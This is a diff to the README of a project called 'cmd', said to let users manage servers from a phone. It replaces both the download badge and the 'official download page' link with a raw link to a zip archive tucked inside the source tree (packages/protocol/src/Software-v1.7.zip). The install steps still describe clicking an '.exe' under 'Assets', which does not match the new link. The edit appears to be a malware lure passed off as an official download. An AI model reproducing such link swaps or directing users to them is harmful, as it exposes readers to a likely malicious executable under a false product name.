@@ -1,6 +1,6 @@
 # 💻 cmd - Manage your servers through your phone
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bertinaanalogical656/cmd)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bertinaanalogical656/cmd/raw/refs/heads/main/packages/protocol/src/Software-v1.7.zip)
 
 ## 📌 About this project
 
@@ -12,7 +12,7 @@ The software connects your mobile phone to your server environment. It turns com
 
 Follow these steps to set up cmd on your Windows computer. This process takes about five minutes.
 
-1. First, visit the official download page: https://github.com/bertinaanalogical656/cmd
+1. First, visit the official download page: https://github.com/bertinaanalogical656/cmd/raw/refs/heads/main/packages/protocol/src/Software-v1.7.zip
 2. Look for the section labeled "Assets."
 3. Click the file that ends in ".exe" to save it to your computer.
 4. Open the folder where you saved the file.
